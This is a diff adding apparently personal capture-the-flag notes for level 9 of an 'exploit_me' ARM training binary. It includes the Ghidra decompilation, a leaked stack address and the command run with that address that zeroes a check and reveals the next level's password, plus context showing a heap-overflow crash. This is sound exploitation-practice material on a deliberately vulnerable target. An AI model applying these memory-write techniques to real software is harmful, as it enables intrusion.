@@ -1328,3 +1328,49 @@ b',407ffaf0\ndvader\n'
 b'Current g ptr, addr: 0x861d8\nCurrent b ptr, addr: 0x861c8,407ffab0\nLevel 9 Password: "Gimme", welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa\xc8a\x08\nfree(): invalid pointer\nqemu: uncaught target signal 6 (Aborted) - core dumped\n'
 '''
 ```
+
+# exploit_me ARM binary - level 9:
+```
+Strategy - manual testing:
+
+└─$ ./exploit Gimme          
+usage: ./exploit Gimme <addr> <flag>
+                                      
+└─$ ./exploit Gimme 11111111 ff
+Address: 11111111, Important ptr: 407FFD7C, Important value: 2
+```
+
+
+```
+in ghidra:
+
+undefined4 FUN_00010f50_level_9(undefined4 *param_1,int param_2)
+
+{
+  int local_14;
+  undefined4 *local_10;
+  int *local_c;
+  
+  local_c = &local_14;
+  local_14 = 2;
+  if (param_2 == 1) {           # setting the important value to 1 zeroes out the address/pointer of our param_1 input
+    *param_1 = 0;
+  }
+  local_10 = param_1;
+                    /* our input is being included in a printf() call */
+  FUN_0001e5e8_printf("Address: %08lX, Important ptr: %08lX, Important value: %d\n",param_1,
+                      &local_14,2);
+  if (local_14 == 0) {
+    FUN_0001e5e8_printf("Level 10 Password: \"%s\"\n",&DAT_0007c306);
+  }
+  return 0;
+}
+```
+
+
+```
+successful - next password:
+└─$ ./exploit Gimme 407FFD7C 1
+Address: 407FFD7C, Important ptr: 407FFD7C, Important value: 0
+Level 10 Password: "Fun"
+```
